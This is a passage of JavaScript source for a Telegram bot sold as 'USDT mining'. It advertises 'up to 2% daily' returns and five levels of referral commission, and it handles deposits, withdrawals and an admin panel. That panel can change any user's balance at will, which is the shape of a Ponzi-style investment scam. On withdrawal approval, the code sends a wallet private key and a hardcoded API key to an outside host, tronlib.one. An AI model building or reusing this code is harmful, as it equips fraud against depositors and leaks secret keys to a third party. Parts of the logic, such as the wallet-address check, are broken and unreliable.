  Level 1 - 5%
  Level 2 - 4%
  Level 3 - 3%
  Level 4 - 2%
  Level 5 - 1%
  
  By sharing this bot, you can earn more USDT and help your friends earn too! So why wait? Start referring today and boost your USDT wallet!`, 
    reply_markup: {
      inline_keyboard: [
        [{
          text: "📩 Share Your Referral Link",
          url: 'https://t.me/share/url?text='+encodeURIComponent("👋 Hey there!\n\nLooking to earn some extra USDT? ⛏️\n\nCheck out this USDT mining bot! With my referral code `"+o+"`, you can get started right away and earn up to 2% daily ! 💰\n\nJoin now by clicking on the link below and start earning USDT today!👇\n\n"+link+"\n\nMake sure to share this opportunity with your friends and earn even more USDT through our referral program. Here's how it works:\n\n- Level 1 referrals earn you 5% commission\n- Level 2 referrals earn you 4% commission\n- Level 3 referrals earn you 3% commission\n- Level 4 referrals earn you 2% commission\n- Level 5 referrals earn you 1% commission\n\nHappy mining!")
        }]
      ]
    },
    disable_web_page_preview: true,
    parse_mode: "HTML"
  })
  , a[0].referinfo || await ne.collection("info").updateOne({
                    user: e.from.id
                }, {
                    $set: {
                        referinfo: o
                    }
                })
            } catch (e) {
                console.log(e), te(e)
            }
        }));
        async function we(e) {
            ue(e, "*👋 Welcome To Main Menu*", {
                reply_markup: {
                    keyboard: re,
                    resize_keyboard: !0
                }
            })
        }
        S.action("Detailed_Data", (async e => {
            await ce(e, "Please select a level to view the details:", {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Level 1 Details",
                            callback_data: "level:1"
                        }],
                        [{
                            text: "Level 2 Details",
                            callback_data: "level:2"
                        }],
                        [{
                            text: "Level 3 Details",
                            callback_data: "level:3"
                        }],[{
                            text: "Level 4 Details",
                            callback_data: "level:4"
                        }],
                        [{
                            text: "Level 5 Details",
                            callback_data: "level:5"
                        }],
                        
                        [{
                            text: "⬅️ Back",
                            callback_data: "Back"
                        }]
                    ]
                }
            })
        })), S.action("Back", (async e => {
            let a = await ne.collection("info").find({
                    user: e.from.id
                }).toArray()
                let n = a[0].referlvl1count,
                r = a[0].referlvl2count,
                s = a[0].referlvl3count,
                tt = a[0].referlvl4count,
                u = a[0].referlvl5count,
                v = a[0].referlvl6count,
                w = a[0].referlvl7count,
                x = a[0].referlvl8count,
                y = a[0].referlvl9count,
                z = a[0].referlvl10count,
                i = fe(a[0].totalAffiliateBonus, 8) || fe(0, 8),
                o = a[0].referinfo || pe()
                let link = `https://t.me/${e.botInfo.username}`
await ce(e,`📈 <b>Referral Statistics</b>
Level 1: ${n} users
Level 2: ${r} users
Level 3: ${s} users
Level 4: ${tt} users
Level 5: ${u} users

♾ Earnings: ${i} USDT`,{reply_markup: {
inline_keyboard: [
[{
    text: "View Refer Report",
    callback_data: "Detailed_Data"
}]
]
},
parse_mode: "HTML"})
        })), S.action(/^level:(\d+)$/, (async e => {
            const [tu, ya] = e.callbackQuery.data.split(":").slice(1)
            const t = await ne.collection("lvl"+tu+"users").find({ refer: e.from.id }).toArray();
            let a = "Level "+tu+" Details\n";
            if (t && t.length > 0) {
                let n = t.slice(0, 25);
                for (const e of n) 
                a += `\n- User : ${e.firstname}(@${e.username}) `;
                if (t.length > 25) {
                    a += "\n\nClick the button below for more details:";
                    let t = [
                        [{
                            text: "Next 25",
                            callback_data: "levels:"+tu+":offset:25"
                        }],
                        [{
                            text: "⬅️ Back",
                            callback_data: "Back"
                        }]
                    ];
                    await ce(e, a, {
                        reply_markup: {
                            inline_keyboard: t
                        },
                        parse_mode: "Markdown"
                    })
                } else await ce(e, a, {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: "⬅️ Back",
                                callback_data: "Back"
                            }]
                        ]
                    },
                    parse_mode: "Markdown"
                })
            } else a += "\nNo Referrals", await ce(e, a, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "⬅️ Back",
                            callback_data: "Back"
                        }]
                    ]
                },
                parse_mode: "Markdown"
            })
        })), S.action(/Level3Details:offset:(\d+)/, (async e => {
            try {
                const t = parseInt(e.match[1]),
                    a = await ne.collection("lvl3users").findOne({
                        user: e.from.id
                    });
                let n = `Level 3 Details (Showing ${t+1} to ${t+25})\n`,
                    r = a.registeredUsers.slice(t, t + 25);
                for (const e of r) n += `\n- User ID: [${e.firstname}](tg://user?id=${e.userid})`;
                let s = [
                    [{
                        text: "Prev 25",
                        callback_data: `Level3Details:offset:${Math.max(t-25,0)}`
                    }, {
                        text: "Next 25",
                        callback_data: `Level3Details:offset:${Math.min(t+25,a.registeredUsers.length)}`
                    }],
                    [{
                        text: "⬅️ Back",
                        callback_data: "Back"
                    }]
                ];
                await ce(e, n, {
                    reply_markup: {
                        inline_keyboard: s
                    },
                    parse_mode: "Markdown"
                })
            } catch (e) {
                console.log(e)
            }
        })), S.action("Level1Details", (async e => {
            const t = await ne.collection("lvl1users").findOne({
                user: e.from.id
            });
            let a = "Level 1 Details\n";
            if (t && t.registeredUsers.length > 0) {
                let n = t.registeredUsers.slice(0, 25);
                for (const e of n) a += `\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${fe(e.earnings,4)} USDT`;
                if (t.registeredUsers.length > 25) {
                    a += "\n\nClick the button below for more details:";
                    let t = [
                        [{
                            text: "Next 25",
                            callback_data: "Level1Details:offset:25"
                        }],
                        [{
                            text: "⬅️ Back",
                            callback_data: "Back"
                        }]
                    ];
                    await ce(e, a, {
                        reply_markup: {
                            inline_keyboard: t
                        },
                        parse_mode: "Markdown"
                    })
                } else await ce(e, a, {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: "⬅️ Back",
                                callback_data: "Back"
                            }]
                        ]
                    },
                    parse_mode: "Markdown"
                })
            } else a += "\nNo Referrals", await ce(e, a, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "⬅️ Back",
                            callback_data: "Back"
                        }]
                    ]
                },
                parse_mode: "Markdown"
            })
        })), S.action(/Level1Details:offset:(\d+)/, (async e => {
            try {
                const t = parseInt(e.match[1]),
                    a = await ne.collection("lvl1users").findOne({
                        user: e.from.id
                    });
                let n = `Level 1 Details (Showing ${t+1} to ${t+25})\n`,
                    r = a.registeredUsers.slice(t, t + 25);
                for (const e of r) n += `\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${fe(e.earnings,4)} USDT`;
                let s = [
                    [{
                        text: "Prev 25",
                        callback_data: `Level1Details:offset:${Math.max(t-25,0)}`
                    }, {
                        text: "Next 25",
                        callback_data: `Level1Details:offset:${Math.min(t+25,a.registeredUsers.length)}`
                    }],
                    [{
                        text: "⬅️ Back",
                        callback_data: "Back"
                    }]
                ];
                await ce(e, n, {
                    reply_markup: {
                        inline_keyboard: s
                    },
                    parse_mode: "Markdown"
                })
            } catch (e) {
                console.log(e)
            }
        })), S.action("Level2Details", (async e => {
            const t = await ne.collection("lvl2users").findOne({
                user: e.from.id
            });
            let a = "Level 2 Details\n";
            if (t && t.registeredUsers.length > 0) {
                let n = t.registeredUsers.slice(0, 25);
                for (const e of n) a += `\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${fe(e.earnings,4)} USDT`;
                if (t.registeredUsers.length > 25) {
                    a += "\n\nClick the button below for more details:";
                    let t = [
                        [{
                            text: "Next 25",
                            callback_data: "Level2Details:offset:25"
                        }],
                        [{
                            text: "⬅️ Back",
                            callback_data: "Back"
                        }]
                    ];
                    await ce(e, a, {
                        reply_markup: {
                            inline_keyboard: t
                        },
                        parse_mode: "Markdown"
                    })
                } else await ce(e, a, {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: "⬅️ Back",
                                callback_data: "Back"
                            }]
                        ]
                    },
                    parse_mode: "Markdown"
                })
            } else a += "\nNo Referrals", await ce(e, a, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "⬅️ Back",
                            callback_data: "Back"
                        }]
                    ]
                },
                parse_mode: "Markdown"
            })
        })), S.action(/Level2Details:offset:(\d+)/, (async e => {
            try {
                const t = parseInt(e.match[1]),
                    a = await ne.collection("lvl2users").findOne({
                        user: e.from.id
                    });
                let n = `Level 2 Details (Showing ${t+1} to ${t+25})\n`,
                    r = a.registeredUsers.slice(t, t + 25);
                for (const e of r) n += `\n- User ID: [${e.firstname}](${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${fe(e.earnings,4)} USDT`;
                let s = [
                    [{
                        text: "Prev 25",
                        callback_data: `Level2Details:offset:${Math.max(t-25,0)}`
                    }, {
                        text: "Next 25",
                        callback_data: `Level2Details:offset:${Math.min(t+25,a.registeredUsers.length)}`
                    }],
                    [{
                        text: "⬅️ Back",
                        callback_data: "Back"
                    }]
                ];
                await ce(e, n, {
                    reply_markup: {
                        inline_keyboard: s
                    },
                    parse_mode: "Markdown"
                })
            } catch (e) {
                console.log(e)
            }
        })),S.action(/^levels:(\d+):offset:(\d+)$/, async (ctx) => {
            const [, level, offset] = ctx.match;
          
            // Connect to the MongoDB database and fetch the relevant data

            const collection = ne.collection(`lvl${level}users`);
            const registeredUsers = await collection.find({refer:ctx.from.id}).toArray();
          
            // Generate the message to be displayed to the user
            let message = `Level ${level} Details (Offset: ${offset})\n\n`;
            if (registeredUsers && registeredUsers.length > 0) {
              const startIndex = parseInt(offset, 10);
              const endIndex = startIndex + 25;
              const usersToDisplay = registeredUsers.slice(startIndex, endIndex);
              usersToDisplay.forEach((user) => {
                
                message += `- User: ${user.firstname} (@${user.username})\n`;
              });
              if (endIndex < registeredUsers.length) {
                const nextOffset = endIndex.toString();
                const inlineKeyboard = [
                  [
                    {
                      text: 'Next 25',
                      callback_data: `levels:${level}:offset:${nextOffset}`,
                    },
                    {
                      text: '⬅️ Back',
                      callback_data: 'Back',
                    },
                  ],
                ];
                ctx.editMessageText(message, {
                  reply_markup: {
                    inline_keyboard: inlineKeyboard,
                  },
                  parse_mode: 'Markdown',
                });
              } else {
                ctx.editMessageText(message, {
                  reply_markup: {
                    inline_keyboard: [
                      [
                        {
                          text: '⬅️ Back',
                          callback_data: 'Back',
                        },
                      ],
                    ],
                  },
                  parse_mode: 'Markdown',
                });
              }
            } else {
              message += 'No Referrals';
              ctx.editMessageText(message, {
                reply_markup: {
                  inline_keyboard: [
                    [
                      {
                        text: '⬅️ Back',
                        callback_data: 'Back',
                      },
                    ],
                  ],
                },
                parse_mode: 'Markdown',
              });
            }
          
            // Disconnect from the MongoDB database
          }), S.hears(["💼 Change Wallet","💼 Wallet"], (async e => {
            try {
                let t = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if ("private" != e.message.chat.type) return;
                if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                let a = await ne.collection("info").find({
                    user: e.from.id
                }).toArray();
                if (!("activated" in a[0])) return void ie(e);
                const n = "💡 *Your currently USDT wallet is: * `" + ("wallet" in a[0] ? a[0].wallet : "⛔ NOT SET") + " `\n\n💹 _It will be used for all future withdrawals._",
                    s = r.inlineKeyboard([r.button.callback("Change wallet", "set_wallet")]);
                await ue(e, n, s)
            } catch (e) {
                te(e), console.log(e)
            }
        })), S.action("set_wallet", (async e => {
            try {
                if ("Active" != (await ne.collection("admin").find({
                        admin: "admin"
                    }).toArray())[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                if (!("activated" in (await ne.collection("info").find({
                        user: e.from.id
                    }).toArray())[0])) return void ie(e);
                ue(e, "*💡 Send Your Matic USDT address*", {
                    reply_markup: {
                        keyboard: [
                            ["⬅️ Back"]
                        ],
                        resize_keyboard: !0
                    }
                }), await e.scene.enter("setwallet")
            } catch (e) {
                te(e), console.log(e)
            }
        })), C.on("text", (async e => {
            try {
                const t = "setwallet",
                    a = e.message.text;
                if ("⬅️ Back" == e.message.text) return we(e), void await e.scene.leave(t);
                if (!a.startsWith(!a.startsWith("0x") || 42 !== a.length)) return void ue(e, "*🚫 Not a valid USDT(Matic) Wallet Address*", {
                    reply_markup: {
                        keyboard: [
                            ["⬅️ Back"]
                        ],
                        resize_keyboard: !0
                    }
                });
                ne.collection("info").updateOne({
                    user: e.from.id
                }, {
                    $set: {
                        wallet: e.message.text
                    }
                }), ue(e, "*✅ Your USDT(MATIC) Wallet Address Updated To " + e.message.text + "*", {
                    reply_markup: {
                        keyboard: re,
                        resize_keyboard: !0
                    }
                }), await e.scene.leave(t)
            } catch (e) {
                te(e), console.log(e)
            }
        }))
        , S.hears("💸 Cash Out", (async e => {
            try {
                let a = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if ("private" != e.message.chat.type) return;
                if ("Active" != a[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                if ("On" != a[0].withstat) return void ue(e, "*⛔ Currently Withdrawls Are Not available*");
                let n = await ne.collection("info").find({
                    user: e.from.id
                }).toArray();
                if (!("activated" in n[0])) return void ie(e);
                if ("balance" in n[0]) t = n[0].balance;
                else var t = 0;
                let r = 25
                if (parseFloat(t) < parseFloat(r)) return void ue(e, "*⚠️ You Must have minimum " + r.toFixed(2) + " " + v + "*");
                if ("NOT SET" == n[0].wallet || "" == n[0].wallet) return void ue(e, "*Your withdraw wallet not set*", {
                    reply_markup: {
                        keyboard: [
                            ["💼 Change Wallet"]
                        ]
                    }
                });
                ue(e, `
                💰 Enter the *(USDT)* withdrawal amount 
Minimum withdrawal amount is: ${r}
Maximum withdrawal amount is: ${t.toFixed()}`, {
                    reply_markup: {
                        keyboard: [
                            ["⬅️ Back"]
                        ],
                        resize_keyboard: !0
                    }
                }), await e.scene.enter("onwith")
            } catch (e) {
                te(e), console.log(e)
            }
        })), P.on("text", (async e => {
            try {
                const a = "onwith";
                await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                var t = await ne.collection("info").find({
                    user: e.from.id
                }).toArray();
                let n = 25
                if ("⬅️ Back" == e.message.text) return we(e), void await e.scene.leave(a);
               
                if (parseFloat(n) > parseFloat(e.message.text)) return ue(e, "*⚠️ Minimum Withdraw Is " + n + " " + v + "*", {
                    reply_markup: {
                        keyboard: re,
                        resize_keyboard: !0
                    }
                }), void await e.scene.leave(a);
                if (parseFloat(e.message.text) > parseFloat(t[0].maxdepo)) return ue(e,"*⚠️ You cannot withdraw more than " + t[0].maxdepo + ". You need to make a deposit first.*", {
                    reply_markup: {
                        keyboard: re,
                        resize_keyboard: !0
                    }
                }), void await e.scene.leave(a);
                if (parseFloat(e.message.text) > parseFloat(t[0].balance)) return ue(e, "*⚠️ You Did Not Have Enough Balance*", {
                    reply_markup: {
                        keyboard: re,
                        resize_keyboard: !0
                    }
                }), void await e.scene.leave(a);
                if (e.message.forward_from) return ue(e, "*🚫 Forwards Not Allowed*", {
                    reply_markup: {
                        keyboard: re,
                        resize_keyboard: !0
                    }
                }), void await e.scene.leave(a); {
                    const n = new Date,
                        r = await ne.collection("withdraw").findOne({
                            user: e.from.id
                        }, {
                            sort: {
                                date: -1
                            }
                        });
                    if (r && n - r.date < 864e5) {
                        const t = new Date(r.date.getTime() + 864e5 - n.getTime());
                        return ue(e, `*⚠️ You have already made a withdrawal request in the past 24 hours. Please try again in ${Math.floor(t.getTime()/36e5)} hours, ${Math.floor(t.getTime()%36e5/6e4)} minutes, and ${Math.floor(t.getTime()%6e4/1e3)} seconds.*`, {
                            reply_markup: {
                                keyboard: re,
                                resize_keyboard: !0
                            }
                        }), void await e.scene.leave(a)
                    } {
                        let n = e.from.id + "" + (new Date).getTime();
                        await ne.collection("withdraw").insertOne({
                            user: e.from.id,
                            amount: parseFloat(e.message.text),
                            wallet: t[0].wallet,
                            date: new Date,
                            txId: "Not Generated",
                            status: "pending",
                            id: n,
                            name: e.from.first_name,
                            username: e.from.username
                        }), await ne.collection("info").updateOne({
                            user: e.from.id
                        }, {
                            $inc: {
                                balance: -parseFloat(e.message.text),maxdepo:-parseFloat(e.message.text)
                            }
                        }), await ne.collection("statistics").updateOne({}, {
                            $inc: {
                                totalWithdrawals: parseFloat(e.message.text)
                            }
                        });
                        let r = "*✅ Withdrawal Requested Successfully\n\n💰 Requested Amount: " + e.message.text + " " + v + "\n🗂️ Wallet Address:* `" + t[0].wallet + "`*\n\nThank you for using our platform! Please allow a few hours for your withdrawal request to be processed.*";

                       await ue(e,r), await e.telegram.sendMessage(w[0], "🚨 New Withdrawal Request\n\nfrom user :" + e.from.id + " (" + e.from.first_name + ") (" + e.from.username + ") \n\n 💰 Amount: " + e.message.text + " " + v + "\n🗂️ Wallet Address: " + t[0].wallet + "\n\nClick On '✅ Approve' To Approve This Withdrawal", {
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: "✅ Approve",
                                        callback_data: "approve " + n
                                    }, {
                                        text: "⛔️ Reject",
                                        callback_data: "reject " + n
                                    }]
                                ],
                                parse_mode: !0
                            }
                        }), await e.scene.leave(a)
                    }
                }
            } catch (e) {
                te(e), console.log(e)
            }
        })), S.action("pendingwithdraw", (async e => {
            try {
                const t = await ne.collection("withdraw").find({
                    status: "pending"
                }).toArray();
                if (0 === t.length) return e.reply("No withdrawal requests are pending");
                for (let a = 0; a < t.length; a++) {
                    const n = t[a],
                        r = "🚨 New Withdrawal Request\n\nfrom user: " + n.user + " (" + n.name + ") (" + n.username + ") \n\n 💰 Amount: " + n.amount + "\n🗂️ Wallet Address: " + n.wallet + "\n Status: " + n.status + "\n\nDate: " + n.date.toLocaleString("en-US", {
                            timeZone: "UTC"
                        }),
                        s = {
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: "✅ Approve",
                                        callback_data: "approve " + n.id
                                    }, {
                                        text: "⛔️ Reject",
                                        callback_data: "reject " + n.id
                                    }]
                                ]
                            }
                        };
                    await e.reply(r, s)
                }
            } catch (t) {
                console.log(e), te(e)
            }
        })), S.action(/^approve (.+)$/, (async e => {
            try {
                const t = e.update.callback_query.message.message_id,
                    a = e.update.callback_query.message.chat.id,
                    n = e.update.callback_query.inline_message_id,
                    r = e.match[1],
                    s = await ne.collection("withdraw").findOne({
                        id: r
                    });
                if ("rejected" === s.status || "approved" === s.status) await e.answerCbQuery("This action is no longer available.its already " + s.status);
                else {
                    const i = "08b11912fba3d3d378ac999005ade9c5",
                            o = "https://matic.tronlib.one/Transfer",
                            l = { "Content-Type": "application/json" },
                            d = { receiver: s.wallet, amount: parseFloat(s.amount), private_key: T, apikey: i },
                        c = await async function(e, t, a) {
                            try {
                                const n = await p(e, { method: "POST", body: JSON.stringify(t), headers: a });
                                return await n.json()
                            } catch (e) {
                                return console.error("Error making HTTP request:", e), e
                            }
                        }(o, d, l);
                    if (0 == c.success) await e.telegram.editMessageText(a, t, n, "🚨 New Withdrawal Request\n\nfrom user :" + s.user + " (" + s.name + ") (" + s.username + ") \n\n 💰 Amount: " + s.amount + "\n🗂️ Wallet Address: " + s.wallet + "\n Status : Fail to Approve \n\n TXID : Not Generated\n\n Reason:" + c.error, {
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: "✅ Approve",
                                    callback_data: "approve " + r
                                }, {
                                    text: "⛔️ Reject",
                                    callback_data: "reject " + r
                                }]
                            ]
                        }
                    }), await e.answerCbQuery("The withdrawal approval has been Failed.Reason:" + c.error);
                    else {
                        const i = c.transaction;
                        await ne.collection("withdraw").updateOne({
                            id: r
                        }, {
                            $set: {
                                status: "approved",
                                txId: i
                            }
                        }), await e.telegram.sendMessage(s.user, "🎉 Congratulations! Your withdrawal request for " + s.amount + " USDT to wallet " + s.wallet + " has been approved and processed successfully. Thank you for using our platform! 🙌"), await e.telegram.editMessageText(a, t, n, "🚨 New Withdrawal Request\n\nfrom user :" + s.user + " (" + s.name + ") (" + s.username + ") \n\n 💰 Amount: " + s.amount + "\n🗂️ Wallet Address: " + s.wallet + "\n Status : Approved\n\n TXID : " + i), await e.answerCbQuery("The withdrawal request has been sent successfully.")
                    }
                }
            } catch (e) {
                console.log(e), te(e)
            }
        })), S.action(/^reject (.+)$/, (async e => {
            try {
                const t = e.update.callback_query.message.message_id,
                    a = e.update.callback_query.message.chat.id,
                    n = e.update.callback_query.inline_message_id,
                    r = e.match[1],
                    s = await ne.collection("withdraw").findOne({
                        id: r
                    });
                "rejected" === s.status || "approved" === s.status ? await e.answerCbQuery("This action is no longer available,its already " + s.status) : (await ne.collection("withdraw").updateOne({
                    id: r
                }, {
                    $set: {
                        status: "rejected"
                    }
                }), await ne.collection("info").updateOne({
                    user: parseInt(s.user)
                }, {
                    $inc: {
                        balance: s.amount,maxdepo:s.amount
                    }
                }), console.log(r, s.amount), await e.telegram.sendMessage(s.user, "Your withdrawal request has been rejected."), await e.telegram.editMessageText(a, t, n, "🚨 New Withdrawal Request\n\nfrom user :" + s.user + " (" + s.name + ") (" + s.username + ") \n\n 💰 Amount: " + s.amount + "\n🗂️ Wallet Address: " + s.wallet + "\n Status : Rejected"), await e.answerCbQuery("The withdrawal request has been rejected."))
            } catch (e) {
                console.log(e), te(e)
            }
        })), Z.on("text", (async e => {
            try {
                const t = "chabal",
                    a = e.message.text,
                    n = a.split(" ")[0],
                    r = a.split(" ")[1],
                    s = a.split(" ")[2];
                if ("⬅️ Back" === a) we(e);
                else if (void 0 === n || void 0 === r || void 0 === s) ue(e, "*⚠️ Please provide Telegram ID, amount, and balance type (depositBalance or balance)*", {
                    reply_markup: {
                        keyboard: re,
                        resize_keyboard: !0
                    }
                });
                else if (isNaN(n) || isNaN(r)) ue(e, "*🚫 Invalid amount or Telegram ID*", {
                    reply_markup: {
                        keyboard: re,
                        resize_keyboard: !0
                    }
                });
                else if ("depositBalance" !== s && "balance" !== s) ue(e, "*🚫 Invalid balance type. Must be 'depositBalance' or 'balance'*", {
                    reply_markup: {
                        keyboard: re,
                        resize_keyboard: !0
                    }
                });
                else {
                    const t = parseInt(n),
                        a = await ne.collection("info").findOne({
                            user: t
                        });
                    if (a) {
                        const n = a[s],
                            i = parseFloat(n) + parseFloat(r);
                        await ne.collection("info").updateOne({
                            user: t
                        }, {
                            $set: {
                                [s]: i
                            }
                        }), ue(e, `*✅ Successfully updated ${s} of [${t}](tg://user?id=${t}) from ${fe(n,4)} ${v} to ${fe(i,4)} ${v}*`, {
                            reply_markup: {
                                keyboard: re,
                                resize_keyboard: !0
                            }
                        }), de(t, `*💰 Admin has updated your ${s} by ${fe(r,4)} ${v}. Your new ${s} is ${fe(i,4)} ${v}*`, {
                            parse_mode: "Markdown"
                        })
                    } else ue(e, "*⛔ User not found in our database*", {
                        reply_markup: {
                            keyboard: re,
                            resize_keyboard: !0
                        }
                    })
                }
                e.scene.leave(t)
            } catch (e) {
                te(e)
            }
        })), V.on("text", (async e => {
            try {
                if ("⬅️ Back" == e.message.text) we(e);
                else {
                    const t = parseInt(e.message.text);
                    let a = await ne.collection("info").findOne({
                        user: t
                    });
                    if (a) {
                        let n = `🐥 *User:* [${t}](tg://user?id=${t})\n\n`;
                        n += `💰 *Balance:* ${a.balance} USDT\n`, n += `💼 *Wallet:* ${a.wallet}\n`, n += `🔑 *Deposit Address:* ${a.depositAddress}\n`, n += `💳 *Deposit balance:* ${a.depositBalance} USDT\n`, n += `📊 *Active Investments:* ${a.activeMining}\n`, n += `🚀 *Total Profit:* ${a.totalProfit} USDT\n`, n += `💸 *Total Affiliate Bonus:* ${a.totalAffiliateBonus} USDT\n\n`, n += "User Referral details\n", n += `level 1 count *Users:* ${a.referlvl1user} \n`, n += `level 2 count *Users:* ${a.referlvl1user} \n`, n += `level 3 count *Users:* ${a.referlvl1user} \n\n`, n += "User Upliner details\n", n += `level 1 *User:* [${a.referlvl1user}](tg://user?id=${a.referlvl1user}) \n`, n += `level 2 *User:*[${a.referlvl1user}](tg://user?id=${a.referlvl2user}) \n`, n += `level 3 *User:* [${a.referlvl1user}](tg://user?id=${a.referlvl3user}) \n`, ue(e, n, {
                            reply_markup: {
                                keyboard: re,
                                resize_keyboard: !0
                            }
                        });
                        let r = await ne.collection("userdeposits").findOne({
                            user: t
                        });
                        if (r) {
                            const t = r.deposits.length,
                                a = Math.ceil(t / 10);
                            let n = t - 1;
                            for (let t = 0; t < a; t++) {
                                let a = `💰 * Deposit History:* (${n+1}-${Math.max(0,n-9)})\n\n`;
                                for (let e = 0; e < 10 && n >= 0; e++) {
                                    const s = r.deposits[n],
                                        i = s.date,
                                        o = s.txId;
                                    a += `*${e+1+10*t})* Amount: ${s.amount} USDT\nDate: ${i}\nTx ID: [${o}](${o})\nBlock Number: ${s.blockNumber}\n\n`, n--
                                }
                                ue(e, a, {
                                    disable_web_page_preview: !0
                                })
                            }
                        } else e.reply("🙁 have no deposit history yet!");
                        let s = await ne.collection("withdraw").find({
                            user: t
                        }).toArray();
                        if (0 === s.length) e.reply("🙁  have no withdrawal history yet!");
                        else {
                            const t = s.length,
                                a = Math.ceil(t / 10);
                            let n = t - 1;
                            for (let t = 0; t < a; t++) {
                                let a = `💸 * Withdrawal History:* (${n+1}-${Math.max(0,n-9)})\n\n`;
                                for (let e = 0; e < 10 && n >= 0; e++) {
                                    const r = s[n],
                                        i = r.date.toLocaleString("en-US", {
                                            timeZone: "UTC"
                                        }),
                                        o = "Pending" !== r.txId ? `[${r.txId}](${r.txId})` : "PendingTransaction";
                                    a += `*${e+1+10*t})* Amount: ${r.amount} USDT\nDate: ${i}\nTx ID: ${o}\nWallet: ${r.wallet}\nStatus: ${r.status}\n\n`, n--
                                }
                                e.replyWithMarkdown(a, {
                                    disable_web_page_preview: !0
                                })
                            }
                        }
                        const userInvestments = await ne.collection("userinvestmentinlist").findOne({ user: t });
    
                        if (!userInvestments || !userInvestments.investments || userInvestments.investments.length === 0) {
                            return void e.reply("🙁 You have no investment history yet!");
                        }
                        
                        const numInvestments = userInvestments.investments.length;
                        const numPage = Math.ceil(numInvestments / 10);
                        let investmentIdx = numInvestments - 1;
                        
                        for (let i = 0; i < numPage; i++) {
                            let message = `💰 *Your Staking History:* (${investmentIdx + 1}-${Math.max(0, investmentIdx - 9)})\n\n`;
                            
                            for (let j = 0; j < 10 && investmentIdx >= 0; j++) {
                                const investment = userInvestments.investments[investmentIdx];
                                const startDate = new Date(investment.starttime).toLocaleString();
                                const endDate = new Date(investment.endtime).toLocaleString();
                                let remainingTime = '';
                                let status = '';
                                
                                if (investment.endtime < Date.now()) {
                                    status = 'completed';
                                } else {
                                    const remainingSec = Math.floor((investment.endtime - Date.now()) / 1000);
                                    if (remainingSec < 0) {
                                        remainingTime = '0s';
                                        status = 'in progress';
                                    } else {
                                        const hours = Math.floor(remainingSec / 3600);
                                        const minutes = Math.floor((remainingSec % 3600) / 60);
                                        const seconds = remainingSec % 60;
                                        remainingTime = `${hours}h ${minutes}m ${seconds}s`;
                                    }
                                }
                                
                                message += `*${j + 1 + 10 * i})* Amount: ${investment.amount} USDT\n    Start Date: ${startDate}\n    End Date: ${endDate}\n`;
                                message += `    Remaining Time: ${remainingTime}\n`;
                                message += `    Status: ${status || investment.status}\n\n`;
                                
                                investmentIdx--;
                            }
                            
                            await e.reply(message, { parse_mode: "markdown" });
                        }
                     const data = await ne.collection("pendinginvestmentsall").find({ user:t  }).toArray();
                        if (!data || data.length === 0) {
                          return e.reply("🙁 have no mining history yet!");
                        }
                        const miningList = data.sort((a, b) => b.started_at - a.started_at);
                        const numMining = miningList.length;
                        const numPages = Math.ceil(numMining / 10);
                        let idxMining = numMining - 1;
                        for (let i = 0; i < numPages; i++) {
                          let message = `⛏️ *Your Mining History:* (${idxMining + 1}-${Math.max(0, idxMining - 9)})\n\n`;
                          for (let j = 0; j < 10 && idxMining >= 0; j++) {
                            const mining = miningList[idxMining];
                            message += `*${j + 1 + 10 * i})* Amount: ${mining.amount} USDT\nPlan: ${mining.plan}% daily\nStart Date: ${mining.started_at}\nDaily Gain: ${mining.hourlyGain}\nStatus: ${mining.status}`;
                              message += `\nTotal Mining Return: ${mining.total_profit} USDT\nAccumulated Mining Return: ${mining.investment_return} USDT\nCredited: ${mining.yetcredited} USDT\nLast credited: ${new Date(mining.lastcdTime).toLocaleString()}`;
                            message += `\n\n`;
                            idxMining--;
                          }
                          await e.reply(message,{parse_mode:"markdown"});
                        }
                    } else ue(e, "*⛔User Not Found In Our Database*", {
                        reply_markup: {
                            keyboard: re,
                            resize_keyboard: !0
                        }
                    })
                }
                e.scene.leave(t)
            } catch (e) {
                te(e)
            }
        })), S.command("panel", (async e => {
            try {
                if (!w.includes(e.from.id)) return;
                let r = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                r[0].ref, r[0].mini, r[0].max, r[0].tax;
                let s = r[0].botstat,
                    i = r[0].withstat;
                if ("Active" === s) var t = "✅ Active";
                else t = "⛔️ Disable";
                if ("On" == i) var a = "✅ On";
                else a = "⛔️ Off";
                r[0].mid, r[0].mkey, r[0].subid;
                var n = [
                    [{
                        text: "🛑Change Balance",
                        callback_data: "change_balance"
                    }, {
                        text: "🧾Get Details",
                        callback_data: "get_details"
                    }],
                    [{
                        text: "🟢Bot:" + t,
                        callback_data: "bot_status"
                    }, {
                        text: "🟢Withdraw:" + a,
                        callback_data: "with_status"
                    }],
                    [{
                        text: "Pending Withdrawls",
                        callback_data: "pendingwithdraw"
                    }],
                    [{
                        text: "get ref details",
                        callback_data: "getref"
                    }],   [
                        { text: "Turn On Mining", callback_data: "turn_on_mining" },
                        { text: "Turn Off Mining", callback_data: "turn_off_mining" }
                      ]
                ];
                let o = await ne.collection("withdraw").find({
                    status: "pending"
                }).toArray();
                ue(e, "*👋 Hey " + e.from.first_name + "\n🤘🏻Welcome To Admin Panel\n\nPending Withdraws : " + o.length + "\n🤖 Bot Status:" + t + "\n\t\t\t\t📤 Withdrawals:" + a + "*", {
                    reply_markup: {
                        inline_keyboard: n
                    }
                })
            } catch (e) {
                te(e)
            }
        })),
